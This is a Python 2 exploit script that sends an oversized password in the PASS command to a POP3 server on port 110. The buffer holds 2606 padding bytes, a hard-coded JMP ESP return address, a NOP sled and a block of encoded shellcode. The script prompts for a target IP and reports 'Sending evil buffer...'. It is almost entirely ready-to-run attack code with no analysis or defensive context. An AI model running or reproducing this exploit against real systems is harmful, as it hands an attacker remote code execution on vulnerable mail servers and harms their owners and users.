#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

targetIP = raw_input('Enter IP associated w/ POP3 target: ')

#   5F  4A  35  8F   # Address that contains "JMP ESP" instruction
# \x8f\x35\x4a\x5f

shellcode = ("\xb8\xca\x36\x2f\x18\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b"
"\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e\x03\x88\x38\xcd"
"\xed\xf0\xad\x93\x0e\x08\x2e\xf4\x87\xed\x1f\x34\xf3"
"\x66\x0f\x84\x77\x2a\xbc\x6f\xd5\xde\x37\x1d\xf2\xd1"
"\xf0\xa8\x24\xdc\x01\x80\x15\x7f\x82\xdb\x49\x5f\xbb"
"\x13\x9c\x9e\xfc\x4e\x6d\xf2\x55\x04\xc0\xe2\xd2\x50"
"\xd9\x89\xa9\x75\x59\x6e\x79\x77\x48\x21\xf1\x2e\x4a"
"\xc0\xd6\x5a\xc3\xda\x3b\x66\x9d\x51\x8f\x1c\x1c\xb3"
"\xc1\xdd\xb3\xfa\xed\x2f\xcd\x3b\xc9\xcf\xb8\x35\x29"
"\x6d\xbb\x82\x53\xa9\x4e\x10\xf3\x3a\xe8\xfc\x05\xee"
"\x6f\x77\x09\x5b\xfb\xdf\x0e\x5a\x28\x54\x2a\xd7\xcf"
"\xba\xba\xa3\xeb\x1e\xe6\x70\x95\x07\x42\xd6\xaa\x57"
"\x2d\x87\x0e\x1c\xc0\xdc\x22\x7f\x8d\x11\x0f\x7f\x4d"
"\x3e\x18\x0c\x7f\xe1\xb2\x9a\x33\x6a\x1d\x5d\x33\x41"
"\xd9\xf1\xca\x6a\x1a\xd8\x08\x3e\x4a\x72\xb8\x3f\x01"
"\x82\x45\xea\x86\xd2\xe9\x45\x67\x82\x49\x36\x0f\xc8"
"\x45\x69\x2f\xf3\x8f\x02\xda\x0e\x58\x27\x1b\x12\x97"
"\x5f\x19\x12\xa6\x24\x94\xf4\xc2\x4a\xf1\xaf\x7a\xf2"
"\x58\x3b\x1a\xfb\x76\x46\x1c\x77\x75\xb7\xd3\x70\xf0"
"\xab\x84\x70\x4f\x91\x03\x8e\x65\xbd\xc8\x1d\xe2\x3d"
"\x86\x3d\xbd\x6a\xcf\xf0\xb4\xfe\xfd\xab\x6e\x1c\xfc"
"\x2a\x48\xa4\xdb\x8e\x57\x25\xa9\xab\x73\x35\x77\x33"
"\x38\x61\x27\x62\x96\xdf\x81\xdc\x58\x89\x5b\xb2\x32"
"\x5d\x1d\xf8\x84\x1b\x22\xd5\x72\xc3\x93\x80\xc2\xfc"
"\x1c\x45\xc3\x85\x40\xf5\x2c\x5c\xc1\x05\x67\xfc\x60"
"\x8e\x2e\x95\x30\xd3\xd0\x40\x76\xea\x52\x60\x07\x09"
"\x4a\x01\x02\x55\xcc\xfa\x7e\xc6\xb9\xfc\x2d\xe7\xeb")

buffer = "A"*2606+"\x8f\x35\x4a\x5f" +"\x90"*16 + shellcode+"C"*(3500-2606-4-351-16)

try:
    print "\nSending evil buffer..."
    s.connect((targetIP,110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer +'\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
